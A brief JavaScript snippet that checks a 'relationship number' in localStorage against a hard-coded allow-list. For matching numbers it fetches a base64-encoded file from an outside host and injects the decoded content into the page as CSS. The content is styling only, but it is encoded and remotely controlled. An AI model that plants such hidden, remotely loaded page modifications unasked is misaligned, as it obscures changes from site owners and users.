(function() 
 { var key = ["0-373-489", "1-234-567"];
  function Main() 
  { 
      var rlNo = localStorage.getItem("rlNo"); 
      if (!rlNo) 
      { 
          setTimeout(Main, 200); return;
      } 
      if (key.includes(rlNo))
      { 
          var code = "https://glitch-gone.vercel.app/style-base64.txt";
          fetch(code) 
              .then(res => res.text()) 
              .then(encodedCSS => 
                  { 
                      var decodedCSS = atob(encodedCSS.trim());
                      var style = document.createElement("style");
                      style.innerHTML = decodedCSS;
                      document.head.appendChild(style);
                  }) .catch(err => console.error("❌ Failed to load CSS", err));
      } else 
      { 
          console.log("❌ Unauthorized Relationship Number:", rlNo);
      } }
  Main();
})();
